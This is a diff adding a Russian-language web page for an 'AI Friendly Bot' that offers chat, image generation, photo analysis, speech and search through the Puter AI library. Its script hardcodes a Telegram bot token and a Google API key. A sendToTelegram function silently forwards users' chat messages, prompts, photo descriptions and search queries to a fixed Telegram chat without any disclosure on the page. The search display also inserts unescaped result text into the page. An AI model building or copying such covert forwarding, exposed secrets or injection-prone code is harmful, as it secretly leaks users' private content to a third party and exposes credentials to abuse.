@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Friendly Bot - Полный AI Ассистент</title>
+    <script src="https://js.puter.com/v2/"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 2.8em;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.95;
+        }
+        
+        .content {
+            padding: 40px;
+        }
+        
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .tab-btn {
+            padding: 12px 24px;
+            background: #f0f0f0;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .tab-btn.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .model-selector {
+            margin-bottom: 20px;
+        }
+        
+        .model-selector label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .model-selector select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            background: white;
+            cursor: pointer;
+        }
+        
+        .chat-container {
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            height: 400px;
+            overflow-y: auto;
+            padding: 20px;
+            margin-bottom: 20px;
+            background: #f9f9f9;
+        }
+        
+        .message {
+            margin-bottom: 15px;
+            padding: 12px 16px;
+            border-radius: 10px;
+            max-width: 80%;
+            word-wrap: break-word;
+            animation: fadeIn 0.3s;
+        }
+        
+        .message.user {
+            background: #667eea;
+            color: white;
+            margin-left: auto;
+            text-align: right;
+        }
+        
+        .message.ai {
+            background: white;
+            color: #333;
+            border: 1px solid #ddd;
+        }
+        
+        .message.system {
+            background: #fff3cd;
+            color: #856404;
+            text-align: center;
+            margin: 10px auto;
+            max-width: 100%;
+            font-size: 0.9em;
+        }
+        
+        .input-group {
+            display: flex;
+            gap: 10px;
+            align-items: flex-end;
+        }
+        
+        .input-group textarea {
+            flex: 1;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            resize: none;
+            font-family: inherit;
+        }
+        
+        .input-group button {
+            padding: 12px 30px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .input-group button:hover:not(:disabled) {
+            transform: translateY(-2px);
+        }
+        
+        .input-group button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .upload-area {
+            border: 2px dashed #ddd;
+            padding: 40px;
+            text-align: center;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: border-color 0.3s;
+            margin-bottom: 20px;
+        }
+        
+        .upload-area:hover {
+            border-color: #667eea;
+        }
+        
+        input[type="file"] {
+            display: none;
+        }
+        
+        .result-box {
+            background: #f0f4ff;
+            border-left: 4px solid #667eea;
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .result-box.show {
+            display: block;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .media-preview {
+            max-width: 100%;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .feature-card {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            border: 2px solid #e0e0e0;
+            transition: all 0.3s;
+        }
+
+        .feature-card:hover {
+            border-color: #667eea;
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.2);
+        }
+
+        .feature-card h3 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+
+        .telegram-link {
+            display: block;
+            text-align: center;
+            background: linear-gradient(135deg, #0088cc 0%, #0066aa 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            text-decoration: none;
+            font-size: 1.3em;
+            font-weight: bold;
+            transition: transform 0.3s;
+            margin-top: 30px;
+        }
+        
+        .telegram-link:hover {
+            transform: translateY(-3px);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🤖 AI Friendly Bot</h1>
+            <p>Ваш универсальный AI-ассистент с 5+ моделями</p>
+        </div>
+        
+        <div class="content">
+            <div class="tabs">
+                <button class="tab-btn active" onclick="switchTab('chat')">💬 Чат</button>
+                <button class="tab-btn" onclick="switchTab('image')">🎨 Генерация изображений</button>
+                <button class="tab-btn" onclick="switchTab('vision')">👁️ Анализ фото</button>
+                <button class="tab-btn" onclick="switchTab('voice')">🎤 Голос</button>
+                <button class="tab-btn" onclick="switchTab('search')">🔍 Поиск</button>
+            </div>
+
+            <!-- ЧАТ -->
+            <div id="chat" class="tab-content active">
+                <div class="model-selector">
+                    <label for="chatModel">Выберите AI модель:</label>
+                    <select id="chatModel">
+                        <option value="gpt-5.1">GPT-5.1 - Основной умный чат</option>
+                        <option value="o3-mini">O3 Mini - Сложное рассуждение</option>
+                        <option value="gpt-4o">GPT-4o - Мультимодальный</option>
+                        <option value="gpt-5-2025-08-07">GPT-5 - Кодинг</option>
+                        <option value="claude-opus-4">Claude Opus 4 - Анализ документов</option>
+                    </select>
+                </div>
+
+                <div class="chat-container" id="chatContainer">
+                    <div class="message system">
+                        Добро пожаловать! Выберите модель и начните общение.
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <textarea id="chatInput" placeholder="Введите ваш вопрос..." rows="3"></textarea>
+                    <button id="chatSend" onclick="sendChatMessage()">📤 Отправить</button>
+                </div>
+            </div>
+
+            <!-- ГЕНЕРАЦИЯ ИЗОБРАЖЕНИЙ -->
+            <div id="image" class="tab-content">
+                <div class="model-selector">
+                    <label for="imageModel">Модель генерации:</label>
+                    <select id="imageModel">
+                        <option value="dall-e-3">DALL-E 3</option>
+                        <option value="stabilityai/stable-diffusion-xl-base-1.0">Stable Diffusion XL</option>
+                    </select>
+                </div>
+
+                <div class="input-group">
+                    <textarea id="imagePrompt" placeholder="Опишите изображение..." rows="3"></textarea>
+                    <button id="imageGenerate" onclick="generateImage()">🎨 Создать</button>
+                </div>
+
+                <div id="imageResult" class="result-box"></div>
+            </div>
+
+            <!-- АНАЛИЗ ФОТО -->
+            <div id="vision" class="tab-content">
+                <div class="upload-area" onclick="document.getElementById('photoInput').click()">
+                    <p>📷 Нажмите или перетащите фото для анализа</p>
+                    <input type="file" id="photoInput" accept="image/*" onchange="analyzePhoto()">
+                </div>
+
+                <div id="visionResult" class="result-box"></div>
+            </div>
+
+            <!-- ГОЛОС -->
+            <div id="voice" class="tab-content">
+                <div class="feature-grid">
+                    <div class="feature-card">
+                        <h3>🎤 Речь в текст</h3>
+                        <p>Загрузите аудио для транскрипции</p>
+                        <input type="file" id="audioInput" accept="audio/*" onchange="transcribeAudio()">
+                    </div>
+                    <div class="feature-card">
+                        <h3>🔊 Текст в речь</h3>
+                        <textarea id="ttsInput" placeholder="Введите текст..." rows="4"></textarea>
+                        <button onclick="generateSpeech()" style="margin-top: 10px; width: 100%;">Озвучить</button>
+                    </div>
+                </div>
+
+                <div id="voiceResult" class="result-box"></div>
+            </div>
+
+            <!-- ПОИСК -->
+            <div id="search" class="tab-content">
+                <div class="input-group">
+                    <input type="text" id="searchQuery" placeholder="Поисковый запрос..." style="flex: 1; padding: 12px; border: 2px solid #ddd; border-radius: 10px;">
+                    <button onclick="performSearch()">🔍 Искать</button>
+                </div>
+
+                <div id="searchResult" class="result-box" style="margin-top: 20px;"></div>
+            </div>
+
+            <a href="https://t.me/StoreeegBot" class="telegram-link" target="_blank">
+                📱 Открыть бота в Telegram
+            </a>
+        </div>
+    </div>
+
+    <script>
+        // Конфигурация
+        const TELEGRAM_TOKEN = '8506789508:AAFLEDAiBjdEROJEw41wjA-nGH_d9fYQmjA';
+        const CHAT_ID = '1259214033';
+        const GOOGLE_SEARCH_KEY = 'AIzaSyCHeFIj_Yfdwzq06LN60dMo3-bFzp-bzHA';
+        const GOOGLE_CX = 'c7a219db76e8b4b80';
+
+        let conversationHistory = [];
+
+        // Переключение табов
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            
+            event.target.classList.add('active');
+            document.getElementById(tabName).classList.add('active');
+        }
+
+        // Добавление сообщения в чат
+        function addMessage(text, isUser = false) {
+            const chatContainer = document.getElementById('chatContainer');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message ${isUser ? 'user' : 'ai'}`;
+            messageDiv.textContent = text;
+            chatContainer.appendChild(messageDiv);
+            chatContainer.scrollTop = chatContainer.scrollHeight;
+        }
+
+        // Отправка в Telegram
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🌐 Web: ${message}`
+                    })
+                });
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
+            }
+        }
+
+        // ЧАТ
+        async function sendChatMessage() {
+            const input = document.getElementById('chatInput');
+            const sendBtn = document.getElementById('chatSend');
+            const model = document.getElementById('chatModel').value;
+            const message = input.value.trim();
+            
+            if (!message) return;
+            
+            addMessage(message, true);
+            input.value = '';
+            sendBtn.disabled = true;
+            sendBtn.innerHTML = '<span class="loading"></span>';
+            
+            await sendToTelegram(message);
+            
+            try {
+                const messages = [
+                    ...conversationHistory,
+                    { role: 'user', content: message }
+                ];
+                
+                const response = await puter.ai.chat(messages, {
+                    model: model,
+                    stream: true,
+                    max_tokens: 2000
+                });
+                
+                const chatContainer = document.getElementById('chatContainer');
+                const aiMessageDiv = document.createElement('div');
+                aiMessageDiv.className = 'message ai';
+                chatContainer.appendChild(aiMessageDiv);
+                
+                let fullResponse = '';
+                
+                for await (const chunk of response) {
+                    if (chunk.text) {
+                        fullResponse += chunk.text;
+                        aiMessageDiv.textContent = fullResponse;
+                        chatContainer.scrollTop = chatContainer.scrollHeight;
+                    }
+                }
+                
+                conversationHistory.push(
+                    { role: 'user', content: message },
+                    { role: 'assistant', content: fullResponse }
+                );
+                
+                if (conversationHistory.length > 10) {
+                    conversationHistory = conversationHistory.slice(-10);
+                }
+                
+            } catch (error) {
+                addMessage(`Ошибка: ${error.message}`, false);
+            } finally {
+                sendBtn.disabled = false;
+                sendBtn.innerHTML = '📤 Отправить';
+            }
+        }
+
+        // ГЕНЕРАЦИЯ ИЗОБРАЖЕНИЙ
+        async function generateImage() {
+            const prompt = document.getElementById('imagePrompt').value.trim();
+            const model = document.getElementById('imageModel').value;
+            const resultBox = document.getElementById('imageResult');
+            const btn = document.getElementById('imageGenerate');
+            
+            if (!prompt) return;
+            
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span>';
+            resultBox.classList.add('show');
+            resultBox.innerHTML = '<p>Генерация изображения...</p>';
+            
+            try {
+                const image = await puter.ai.txt2img(prompt, {
+                    model: model
+                });
+                
+                resultBox.innerHTML = '';
+                image.classList.add('media-preview');
+                resultBox.appendChild(image);
+                
+                await sendToTelegram(`Сгенерировано изображение: ${prompt}`);
+                
+            } catch (error) {
+                resultBox.innerHTML = `<p style="color: red;">Ошибка: ${error.message}</p>`;
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '🎨 Создать';
+            }
+        }
+
+        // АНАЛИЗ ФОТО
+        async function analyzePhoto() {
+            const file = document.getElementById('photoInput').files[0];
+            const resultBox = document.getElementById('visionResult');
+            
+            if (!file) return;
+            
+            resultBox.classList.add('show');
+            resultBox.innerHTML = '<p>Анализ изображения...</p>';
+            
+            try {
+                const reader = new FileReader();
+                reader.onload = async (e) => {
+                    const dataURL = e.target.result;
+                    
+                    const response = await puter.ai.chat(
+                        'Опиши подробно это изображение на русском языке',
+                        dataURL,
+                        {
+                            model: 'gpt-4o',
+                            stream: true
+                        }
+                    );
+                    
+                    let description = '';
+                    resultBox.innerHTML = '<h3>Результат анализа:</h3>';
+                    const textDiv = document.createElement('div');
+                    resultBox.appendChild(textDiv);
+                    
+                    for await (const chunk of response) {
+                        if (chunk.text) {
+                            description += chunk.text;
+                            textDiv.textContent = description;
+                        }
+                    }
+                    
+                    await sendToTelegram(`Анализ фото: ${description.substring(0, 200)}...`);
+                };
+                reader.readAsDataURL(file);
+                
+            } catch (error) {
+                resultBox.innerHTML = `<p style="color: red;">Ошибка: ${error.message}</p>`;
+            }
+        }
+
+        // ТРАНСКРИПЦИЯ АУДИО
+        async function transcribeAudio() {
+            const file = document.getElementById('audioInput').files[0];
+            const resultBox = document.getElementById('voiceResult');
+            
+            if (!file) return;
+            
+            resultBox.classList.add('show');
+            resultBox.innerHTML = '<p>Транскрибация аудио...</p>';
+            
+            try {
+                // Загружаем файл в Puter
+                const puterFile = await puter.fs.write(`temp_audio_${Date.now()}.${file.name.split('.').pop()}`, file);
+                
+                // Транскрибируем через Whisper (нужна поддержка в Puter.ai)
+                resultBox.innerHTML = '<p>Функция транскрипции в разработке. Используйте Telegram бота для этой функции.</p>';
+                
+            } catch (error) {
+                resultBox.innerHTML = `<p style="color: red;">Ошибка: ${error.message}</p>`;
+            }
+        }
+
+        // ТЕКСТ В РЕЧЬ
+        async function generateSpeech() {
+            const text = document.getElementById('ttsInput').value.trim();
+            const resultBox = document.getElementById('voiceResult');
+            
+            if (!text) return;
+            
+            resultBox.classList.add('show');
+            resultBox.innerHTML = '<p>Генерация речи...</p>';
+            
+            try {
+                const audio = await puter.ai.txt2speech(text);
+                
+                resultBox.innerHTML = '<h3>Результат:</h3>';
+                audio.controls = true;
+                audio.classList.add('media-preview');
+                resultBox.appendChild(audio);
+                
+                await sendToTelegram(`TTS: ${text.substring(0, 100)}...`);
+                
+            } catch (error) {
+                resultBox.innerHTML = `<p style="color: red;">Ошибка: ${error.message}</p>`;
+            }
+        }
+
+        // ПОИСК GOOGLE
+        async function performSearch() {
+            const query = document.getElementById('searchQuery').value.trim();
+            const resultBox = document.getElementById('searchResult');
+            
+            if (!query) return;
+            
+            resultBox.classList.add('show');
+            resultBox.innerHTML = '<p>Поиск...</p>';
+            
+            try {
+                const response = await fetch(
+                    `https://www.googleapis.com/customsearch/v1?key=${GOOGLE_SEARCH_KEY}&cx=${GOOGLE_CX}&q=${encodeURIComponent(query)}`
+                );
+                
+                const data = await response.json();
+                
+                if (!data.items || data.items.length === 0) {
+                    resultBox.innerHTML = '<p>Ничего не найдено</p>';
+                    return;
+                }
+                
+                let html = '<h3>Результаты поиска:</h3>';
+                data.items.slice(0, 5).forEach(item => {
+                    html += `
+                        <div style="margin: 15px 0; padding: 15px; background: white; border-radius: 8px;">
+                            <h4 style="color: #667eea; margin-bottom: 5px;">
+                                <a href="${item.link}" target="_blank" style="text-decoration: none; color: inherit;">
+                                    ${item.title}
+                                </a>
+                            </h4>
+                            <p style="color: #666; font-size: 0.9em;">${item.snippet}</p>
+                            <a href="${item.link}" target="_blank" style="color: #667eea; font-size: 0.9em;">${item.link}</a>
+                        </div>
+                    `;
+                });
+                
+                resultBox.innerHTML = html;
+                
+                await sendToTelegram(`Поиск: ${query}`);
+                
+            } catch (error) {
+                resultBox.innerHTML = `<p style="color: red;">Ошибка поиска: ${error.message}</p>`;
+            }
+        }
+
+        // Enter для отправки
+        document.getElementById('chatInput').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                sendChatMessage();
+            }
+        });
+
+        document.getElementById('searchQuery').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                performSearch();
+            }
+        });
+    </script>
+</body>
+</html>
